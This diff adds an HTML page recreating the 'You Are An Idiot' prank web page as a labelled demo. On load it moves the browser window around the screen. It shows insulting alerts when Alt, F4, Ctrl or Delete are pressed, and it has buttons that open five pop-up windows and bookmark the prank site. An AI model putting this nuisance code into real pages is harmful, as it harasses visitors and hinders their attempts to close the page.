@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>You Are An Idiot - Demo</title>
+
+<script>
+function bookmark() {
+    if ((navigator.appName == "Microsoft Internet Explorer")
+    && (parseInt(navigator.appVersion) >= 4))
+    {
+        var url = "http://youareanidiot.org";
+        var title = "Idiot!";
+        window.external.AddFavorite(url, title);
+    }
+}
+
+function altf4key() {
+    if (event.keyCode == 18 || event.keyCode == 115)
+        alert("You are an idiot!");
+}
+
+function ctrlkey() {
+    if (event.keyCode == 17)
+        alert("You are an idiot!");
+}
+
+function delkey() {
+    if (event.keyCode == 46)
+        alert("You are an idiot!");
+}
+
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = -100;
+var flagRun = 1;
+
+function openWindow(url) {
+    aWindow = window.open(
+        url,
+        "_blank",
+        "menubar=no,status=no,toolbar=no,resizable=no,width=180,height=175"
+    );
+}
+
+function procreate() {
+    openWindow("index.htm");
+    openWindow("index.htm");
+    openWindow("index.htm");
+    openWindow("index.htm");
+    openWindow("index.htm");
+}
+
+function newXlt() {
+    xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+    window.focus();
+}
+
+function newXrt() {
+    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+
+function newYup() {
+    yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+}
+
+function newYdn() {
+    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+
+function fOff() {
+    flagrun = 0;
+}
+
+function playBall() {
+    xPos += xOff;
+    yPos += yOff;
+
+    if (xPos > screen.width - 175) {
+        newXlt();
+    }
+
+    if (xPos < 0) {
+        newXrt();
+    }
+
+    if (yPos > screen.height - 100) {
+        newYup();
+    }
+
+    if (yPos < 0) {
+        newYdn();
+    }
+
+    if (flagRun == 1) {
+        window.moveTo(xPos, yPos);
+        setTimeout("playBall()", 1);
+    }
+}
+</script>
+
+</head>
+
+<body
+    onkeydown="altf4key();ctrlkey();delkey();"
+    onload="playBall();">
+
+    <h1>You Are An Idiot - Demo</h1>
+
+    <button onclick="bookmark()">Añadir a favoritos (IE)</button>
+    <button onclick="procreate()">Abrir ventanas</button>
+    <button onclick="playBall()">Mover ventana</button>
+
+</body>
+</html>
